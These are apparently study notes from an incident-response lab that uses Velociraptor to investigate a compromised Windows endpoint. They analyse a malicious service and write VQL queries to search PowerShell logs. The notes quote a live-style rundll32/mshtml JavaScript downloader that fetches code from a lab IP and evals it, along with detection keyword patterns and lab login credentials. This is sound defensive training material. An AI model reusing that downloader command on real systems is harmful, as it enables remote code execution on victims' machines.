#### **Scenario**: 
This lab continues from where the lab “Enterprise-wide Incident Response (Part 1: GRR)”
left off.
Another affected Windows endpoint (WIN10.els-child.eLS.local) existed inside the same
intranet subnet (10.100.11.0/24), which was monitored not by GRR, but by the
Velociraptor IR framework.
Velociraptor is based on GRR, but has some additional capabilities, such as the ability to
remotely (or locally) execute Velocidex Query Language (VQL) queries and better event
monitoring.
Your mission is still the same. You are called to identify what is actually happening inside
the WIN10.els-child.eLS.local endpoint, but this time, you will have to leverage the
Velociraptor framework’s capabilities.

#### **Objectives**
Specifically, you will learn how to use Velociraptor’s capabilities in order to:
-  Have better visibility over a network
- Respond to incidents timely and effectively
- Remotely execute Velocidex Query Language (VQL) queries and extract critical data
During the lab you will have the opportunity to detect fileless malware and stealthy
persistence techniques, on a heterogeneous and enterprise-like network. 

#### **Network Configuration**
-  Incident Responder’s Subnet: 172.16.67.0/24
- Under-investigation endpoints’ subnet: 10.100.11.0/24
- Velociraptor server
	- IP: 10.100.11.121
	- Connection Type: VNC
	- Use a Linux or Windows VNC client to connect to Velociraptor server (10.100.11.121)
A static route has been configured, so that the Incident Responder can interact with the
endpoints on the 10.100.11.0/24 subnet.
To log into the Velociraptor administration panel (after you connect to the Velociraptor
server through VNC as mentioned above):
1. Open a web browser
2. Navigate to localhost:8889
3. Submit the following credentials: admin/analyst

- Linux-based Machine: 
```
# vncviewer 10.100.11.121
```

- Windows-based Machine: 
```
tightvncviewer.exe
Remote Host:10.100.11.121
```


#### Task 1:  WIN10.ELS-CHILD.ELS.LOCAL Endpoint

First things first! Once you are logged into the Velociraptor administration panel, you can list all the deployed Velociraptor clients, by clicking on the Search box and pressing nothing other than Enter: 
![[Pasted image 20250912083134.png]]
![[Pasted image 20250912083218.png]][!] Important: Do not start any IR activities, until the bullet turns green! It may take some
time until it does so… To refresh, click on the Velociraptor logo and then, once again click
on the Search box and press Enter [!]

![[Pasted image 20250912084435.png]]

Step 1: Start gathering information with **Velociraptor Flow** 

1.1: Collect all newly-created services: Collectors > Artifact Collector > add "Windows.Events.ServiceCreation" > Launch
![[Pasted image 20250912084544.png]]
![[Pasted image 20250912084750.png]]

Look carefully and analyse: 
![[Pasted image 20250912084817.png]]

``` powershell
C:\Windows\system32\cmd.exe /Q /c rundll32.exe javascript:...mshtml,RunHTMLApplication;
 document.write();
 h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 w = new ActiveXObject("WScript.Shell");
 h.Open("GET", "http://10.100.11.250:80/connect", false);
 h.Send();
 B = h.ResponseText;
 eval(B);
```
1. **Remote code fetch + immediate execution
2. **Use of `rundll32` + `mshtml` to run inline JavaScript
3. **Use of ActiveX `WinHttp` and `WScript.Shell`
4. **Synchronous call to an external IP
5. **Obfuscated / typoed binary name** (`rundl132.exe` in logs)
6. **In-process execution (no disk artifact necessary)**
7. **Context: discovered in Velociraptor recently-created services flow**
8. **Behavioral fingerprint matches many real malware downloaders/C2 loaders**

##### IoC: 
- `rundll32.exe` is a legitimate Windows executable used to run DLL entry points. The `mshtml,RunHTMLApplication` entry point abuses the Internet Explorer HTML engine to execute _inline_ HTML/JavaScript passed on the command line. This is identical in capability to `mshta.exe` and is a known living-off-the-land technique to run script without dropping a file.

- A synchronous HTTP GET to a server; the returned body (`B`) is immediately available for execution. Synchronous fetches are frequently used by downloaders to ensure code is retrieved before continuing.

Specifically, once again we come across rundll32 executing malicious JavaScript code. This
time, persistence is achieved through the creation of a malicious service. 

==Let's suppose that this machine features PowerShell ScriptBlock Logging. Let’s extract
and inspect those logs by executing a Velocidex Query Language (VQL) query.

Start new flows > Collectors > VQL Collector > specifying the query below: 
``` sql
SELECT EventData, System.TimeCreated.SystemTime from
parse_evtx(filename= 'c:/windows/system32/winevt/logs/Microsoft-
Windows-PowerShell%4Operational.evtx')
```

- In short:
	- `parse_evtx()` → open log
	- `filename=` → points to PowerShell Operational log
	- `SELECT EventData, System.TimeCreated.SystemTime` → extract executed script + timestamp

It essentially **pulls every PowerShell script executed on the host** so you can inspect them for malicious activity.

To optimize it even more to **automatically filter for suspicious commands like your `rundll32/mshtml`** downloader: 

``` sql
SELECT EventData, System.TimeCreated.SystemTime
FROM parse_evtx(
    filename='c:/windows/system32/winevt/logs/Microsoft-Windows-PowerShell%4Operational.evtx'
)
WHERE EventData CONTAINS "rundll32" 
   OR EventData CONTAINS "mshtml" 
   OR EventData CONTAINS "WinHttp.WinHttpRequest"
```


- This query pulls all PowerShell ScriptBlock logs that contain **suspicious commands** along with their timestamps, so you can quickly identify potential malicious executions.

![[Pasted image 20250912113015.png]]

Here are the results: 
(1):
![[Pasted image 20250912114003.png]]

(2):
![[Pasted image 20250912114045.png]]

(3).
![[Pasted image 20250912113548.png]]

(1) & (2) indicates that a hacking tool **inveigh** was loaded into the endpoint’s memory, through PowerShell. 

(3) indicates a PowerShell ScriptBlock Logging log, that indicates an obfuscated PowerShell script being loaded into the endpoint’s memory trying to download something and execute it from a remote location. 